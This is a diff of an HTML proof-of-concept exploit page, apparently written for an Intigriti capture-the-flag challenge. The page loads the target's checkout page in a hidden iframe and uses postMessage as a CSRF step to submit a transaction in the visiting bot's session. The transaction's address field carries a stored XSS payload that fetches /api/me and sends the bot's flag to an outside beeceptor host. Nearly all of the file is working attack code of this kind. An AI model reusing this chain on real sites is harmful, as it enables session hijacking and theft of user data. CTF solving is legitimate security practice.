@@ -1,46 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Jan Challenge - Exploit Scout</title>
+    <title>PoC - CRYPTIGRITI</title>
 </head>
 <body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1>Security Audit in Progress...</h1>
-    <p>Bypassing encryption layers... Please wait.</p>
+    <h1>Exploit Scout - Security Audit</h1>
+    <p>Establishing secure connection to DeFi API...</p>
 
     <script>
         // --- CONFIG ---
-        const challenge = "https://challenge-0126.intigriti.io";
-        // REPLACE WITH YOUR BEECEPTOR URL
+        const target = "https://challenge-0126.intigriti.io";
+        // REPLACE WITH YOUR ACTUAL BEECEPTOR URL
         const beeceptor = "https://kavil.free.beeceptor.com";
         
         // --- THE PAYLOAD ---
-        // We use <img> because your local test proved it works best.
-        // It fetches the flag and sends it to you Base64 encoded.
+        // Your local test proved this <img> tag works.
+        // It fetches the Bot's flag and sends it to your Beeceptor.
         const xss = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
 
         // --- THE ATTACK ---
+        // 1. Create a hidden iframe to the checkout page
         const ifr = document.createElement('iframe');
-        ifr.src = `${challenge}/checkout.html?currency=1337COIN&price=1000000`;
+        // Targeting 1337COIN so the Bot's transaction succeeds
+        ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
         ifr.style.display = "none";
         document.body.appendChild(ifr);
 
         ifr.onload = () => {
+            // 2. Give the checkout page 1.5s to load its message listener
             setTimeout(() => {
-                // CSRF: Send the transaction command to the checkout page
+                // 3. CSRF: Send the command to submit the transaction.
+                // The Bot's browser will attach its 'token' cookie automatically.
                 ifr.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: xss,
+                        toAddress: xss, // Our XSS goes here
                         currency: '1337COIN',
-                        amount: 100,000,000
+                        amount: 0.000001
                     }
                 }, '*');
 
-                // Redirect to MarketWatch to trigger the stored XSS
+                // 4. Wait for the transaction to be written to the DB, then trigger XSS
                 setTimeout(() => {
-                    window.location.href = `${challenge}/marketwatch.html`;
-                }, 3000);
-            }, 5000);
+                    window.location.href = `${target}/marketwatch.html`;
+                }, 2500);
+            }, 1500);
         };
     </script>
 </body>
